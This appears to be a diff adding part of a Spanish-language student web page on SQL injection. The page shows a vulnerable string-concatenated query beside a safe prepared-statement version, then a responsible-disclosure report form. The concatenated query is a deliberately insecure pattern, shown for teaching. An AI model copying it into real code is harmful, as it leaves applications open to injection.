+        <h2 class="display-6 fw-bold tw-text-white" style="font-family:'Exo 2'">Casos de Prueba y Mitigacion</h2>
+        <p class="tw-text-slate-400">Ejemplos simples de consultas vulnerables y su version segura.</p>
+      </div>
+
+      <div class="row g-4">
+        <div class="col-md-6">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300" style="background:#1e293b; border:1px solid rgba(239,68,68,0.25);">
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-2 tw-mb-3">
+                <span class="badge bg-danger" style="font-size:0.7rem;"><i class="bi bi-x-circle me-1"></i>Vulnerable</span>
+                <span class="badge tw-bg-red-900 tw-text-red-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Concatenacion</span>
+              </div>
+              <pre class="tw-m-0 tw-text-xs tw-leading-relaxed" style="font-family:'Share Tech Mono'; color:#e6edf3;"><code><span style="color:#79c0ff;">-- Entrada del usuario sin validar</span>
+<span style="color:#ff7b72;">SELECT</span> * <span style="color:#ff7b72;">FROM</span> users
+<span style="color:#ff7b72;">WHERE</span> user = '<span style="color:#ffa657;">" + input + "</span>';</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-6">
+          <div class="card h-100 tw-rounded-xl tw-shadow-lg hover:tw-scale-105 tw-transition-all tw-duration-300" style="background:#1e293b; border:1px solid rgba(34,197,94,0.25);">
+            <div class="card-body tw-p-6">
+              <div class="tw-flex tw-items-center tw-gap-2 tw-mb-3">
+                <span class="badge bg-success" style="font-size:0.7rem;"><i class="bi bi-check-circle me-1"></i>Seguro</span>
+                <span class="badge tw-bg-green-900 tw-text-green-300 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.7rem;">Parametros</span>
+              </div>
+              <pre class="tw-m-0 tw-text-xs tw-leading-relaxed" style="font-family:'Share Tech Mono'; color:#e6edf3;"><code><span style="color:#79c0ff;">-- Prepared Statement</span>
+<span style="color:#ff7b72;">SELECT</span> * <span style="color:#ff7b72;">FROM</span> users
+<span style="color:#ff7b72;">WHERE</span> user = ?;</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="contacto" class="tw-py-20" style="background: linear-gradient(180deg, #0c1524 0%, #0f172a 100%);">
+    <div class="container">
+      <div class="row justify-content-center">
+        <div class="col-lg-7">
+
+          <div class="tw-text-center tw-mb-10">
+            <span class="badge bg-primary tw-px-4 tw-py-2 tw-text-xs tw-tracking-widest tw-uppercase tw-mb-4" style="font-family:'Share Tech Mono'">
+              <i class="bi bi-envelope me-1"></i>Contacto
+            </span>
+            <h2 class="display-6 fw-bold tw-text-white" style="font-family:'Exo 2'">Reporte de Vulnerabilidad</h2>
+            <p class="tw-text-slate-400">¿Encontraste una vulnerabilidad SQL? Repórtala de forma responsable.</p>
+          </div>
+
+          <div class="tw-rounded-2xl tw-p-8" style="background:#1e293b; border:1px solid rgba(99,102,241,0.25);">
+            <form id="formReporte" novalidate>
+
+              <div class="row g-3 mb-3">
+                <div class="col-md-6">
+                  <label for="nombreReportador" class="form-label tw-text-slate-300 tw-text-sm tw-font-semibold">
+                    Nombre Completo <span class="tw-text-red-400">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    class="form-control tw-bg-slate-800 tw-text-white tw-border-slate-600 focus:tw-border-indigo-500"
+                    id="nombreReportador"
+                    name="nombre"
+                    placeholder="Tu nombre"
+                    required
+                    minlength="3"
+                    maxlength="80"
+                    aria-describedby="nombreFeedback nombreHelp"
+                    autocomplete="name"
+                    style="background:#0f172a; color:#f1f5f9; border-color:#334155;"
+                  />
+                  <div id="nombreHelp" class="form-text tw-text-slate-500" style="font-size:0.75rem;">Mínimo 3 caracteres.</div>
+                  <div id="nombreFeedback" class="invalid-feedback">Por favor ingresa tu nombre completo (mín. 3 caracteres).</div>
+                  <div class="valid-feedback">¡Nombre válido!</div>
+                </div>
+
+                <div class="col-md-6">
+                  <label for="emailReportador" class="form-label tw-text-slate-300 tw-text-sm tw-font-semibold">
+                    Correo Electrónico <span class="tw-text-red-400">*</span>
+                  </label>
+                  <input
+                    type="email"
+                    class="form-control"
+                    id="emailReportador"
+                    name="email"
+                    placeholder="tu@correo.com"
+                    required
+                    aria-describedby="emailFeedback"
+                    autocomplete="email"
+                    style="background:#0f172a; color:#f1f5f9; border-color:#334155;"
+                  />
+                  <div id="emailFeedback" class="invalid-feedback">Ingresa un correo electrónico válido.</div>
+                  <div class="valid-feedback">Correo válido.</div>
+                </div>
+              </div>
+
+              <div class="mb-3">
+                <label for="tipoVuln" class="form-label tw-text-slate-300 tw-text-sm tw-font-semibold">
+                  Tipo de Inyección <span class="tw-text-red-400">*</span>
+                </label>
+                <select
+                  class="form-select"
+                  id="tipoVuln"
+                  name="tipo"
+                  required
+                  aria-describedby="tipoFeedback"
+                  style="background:#0f172a; color:#f1f5f9; border-color:#334155;"
+                >
+                  <option value="" disabled selected>Selecciona el tipo...</option>
+                  <option value="inband">In-Band SQLi (Error/Union-Based)</option>
+                  <option value="blind">Blind SQLi (Boolean/Time-Based)</option>
+                  <option value="outofband">Out-of-Band SQLi</option>
+                  <option value="stored">Stored SQLi</option>
+                  <option value="secondorder">Second-Order SQLi</option>
+                  <option value="nosql">NoSQL Injection</option>
+                  <option value="otro">Otro</option>
+                </select>
+                <div id="tipoFeedback" class="invalid-feedback">Por favor selecciona el tipo de vulnerabilidad.</div>
+              </div>
+
+              <div class="mb-3">
+                <label class="form-label tw-text-slate-300 tw-text-sm tw-font-semibold">
+                  Severidad (CVSS) <span class="tw-text-red-400">*</span>
+                </label>
+                <div class="d-flex gap-3 flex-wrap" role="radiogroup" aria-label="Nivel de severidad de la vulnerabilidad">
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="severidad" id="sevBaja" value="baja" required />
+                    <label class="form-check-label tw-text-green-400 tw-font-semibold" for="sevBaja">Baja (0-3.9)</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="severidad" id="sevMedia" value="media" />
+                    <label class="form-check-label tw-text-yellow-400 tw-font-semibold" for="sevMedia">Media (4.0-6.9)</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="severidad" id="sevAlta" value="alta" />
+                    <label class="form-check-label tw-text-orange-400 tw-font-semibold" for="sevAlta">Alta (7.0-8.9)</label>
+                  </div>
+                  <div class="form-check">
+                    <input class="form-check-input" type="radio" name="severidad" id="sevCritica" value="critica" />
+                    <label class="form-check-label tw-text-red-500 tw-font-semibold" for="sevCritica">Crítica (9.0-10)</label>
+                  </div>
+                </div>
+                <div class="invalid-feedback d-block" id="sevFeedback" style="display:none!important;"></div>
+              </div>
+
+              <div class="mb-3">
+                <label for="urlAfectada" class="form-label tw-text-slate-300 tw-text-sm tw-font-semibold">
+                  URL / Endpoint Afectado
+                </label>
+                <div class="input-group">
+                  <span class="input-group-text tw-text-slate-400" style="background:#0f172a; border-color:#334155;">
+                    <i class="bi bi-link-45deg"></i>
+                  </span>
+                  <input
+                    type="url"
+                    class="form-control"
+                    id="urlAfectada"
+                    name="url"
+                    placeholder="https://ejemplo.com/login?id=1"
+                    aria-describedby="urlHelp"
+                    style="background:#0f172a; color:#f1f5f9; border-color:#334155;"
+                  />
+                </div>
+                <div id="urlHelp" class="form-text tw-text-slate-500" style="font-size:0.75rem;">Opcional. Si conoces el endpoint vulnerable.</div>
+              </div>
+
+              <div class="mb-3">
+                <label for="descripcionVuln" class="form-label tw-text-slate-300 tw-text-sm tw-font-semibold">
+                  Descripción del Hallazgo <span class="tw-text-red-400">*</span>
+                </label>
+                <textarea
+                  class="form-control tw-peer"
+                  id="descripcionVuln"
+                  name="descripcion"
+                  rows="4"
+                  placeholder="Describe el payload utilizado, el comportamiento observado y el impacto potencial..."
+                  required
+                  minlength="20"
+                  maxlength="1000"
+                  aria-describedby="descFeedback descContador"
+                  style="background:#0f172a; color:#f1f5f9; border-color:#334155; resize:vertical;"
+                ></textarea>
+                <div class="tw-flex tw-justify-between tw-items-center tw-mt-1">
+                  <div id="descFeedback" class="invalid-feedback tw-block">Describe el hallazgo (mín. 20 caracteres).</div>
+                  <small id="descContador" class="tw-text-slate-500 tw-text-xs ms-auto tw-peer-invalid:tw-text-red-400">0 / 1000</small>
+                </div>
+              </div>
+
+              <div class="mb-4">
+                <div class="form-check">
+                  <input
+                    class="form-check-input"
+                    type="checkbox"
+                    id="confirmEtica"
+                    name="etica"
+                    required
+                    aria-describedby="eticaFeedback"
+                  />
+                  <label class="form-check-label tw-text-slate-400 tw-text-sm" for="confirmEtica">
+                    Confirmo que este reporte es con fines éticos y tengo autorización para probar este sistema.
+                    <span class="tw-text-red-400">*</span>
+                  </label>
+                  <div id="eticaFeedback" class="invalid-feedback">Debes confirmar el propósito ético del reporte.</div>
+                </div>
+              </div>
+
+              <div class="d-flex gap-3 flex-wrap">
+                <button
+                  type="submit"
+                  class="btn btn-danger tw-px-8 tw-py-3 tw-font-semibold tw-rounded-lg hover:tw-scale-105 tw-transition-transform"
+                  style="font-family:'Exo 2'; letter-spacing:1px;"
+                >
+                  <i class="bi bi-send-fill me-2"></i>Enviar Reporte
+                </button>
+                <button
+                  type="reset"
+                  class="btn btn-outline-secondary tw-px-6 tw-py-3 tw-rounded-lg hover:tw-scale-105 tw-transition-transform"
+                  style="font-family:'Exo 2';"
+                >
+                  <i class="bi bi-x-circle me-2"></i>Limpiar
+                </button>
+              </div>
+
+              <div id="mensajeExito" class="alert alert-success tw-mt-4 tw-rounded-lg tw-hidden" role="alert" aria-live="polite" style="display:none!important;">
+                <i class="bi bi-check-circle-fill me-2"></i>
+                <strong>¡Reporte enviado!</strong> Gracias por tu contribución responsable a la seguridad.
+              </div>
+
+            </form>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer class="tw-py-8 tw-text-center" style="background:#060d18; border-top:1px solid rgba(239,68,68,0.2);">
+    <div class="container">
+      <p class="tw-text-slate-600 tw-text-sm tw-font-mono tw-mb-1">
+        Universidad Nacional del Centro del Perú · Facultad de Ingeniería de Sistemas
+      </p>
+      <p class="tw-text-slate-700 tw-text-xs">
+        IS093A – Desarrollo de Aplicaciones Web | Unidad I: Desarrollo Web Frontend
+      </p>
+      <div class="tw-flex tw-justify-center tw-gap-4 tw-mt-4">
+        <span class="badge tw-bg-slate-800 tw-text-slate-500 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.65rem;">Bootstrap 5.3.3</span>
+        <span class="badge tw-bg-slate-800 tw-text-slate-500 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.65rem;">Tailwind CSS Play CDN</span>
+        <span class="badge tw-bg-slate-800 tw-text-slate-500 tw-rounded-full tw-px-3 tw-py-1" style="font-size:0.65rem;">OWASP 2024</span>
+      </div>
+    </div>
+  </footer>
+
+  <script
+    src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-YvpcrYf0tY3lHB60NNkmXc4s9bIOgUxi8T/jzmQcFxQcGAi3vBXP1mOeGVvFqgr2"
+    crossorigin="anonymous"
+  ></script>
+
+  <script src="main.js"></script>
+</body>
+</html>
